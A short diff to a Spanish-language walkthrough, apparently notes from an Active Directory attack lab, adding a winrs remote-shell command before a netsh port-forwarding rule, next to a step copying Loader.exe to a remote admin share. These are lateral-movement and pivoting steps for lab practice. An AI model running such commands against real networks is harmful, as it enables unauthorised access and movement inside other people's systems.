@@ -605,6 +605,7 @@ echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 
 Haremos el renvió de puertos
 ```shell
+winrs -r:dcorp-adminsrv cmd
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
 ```
 
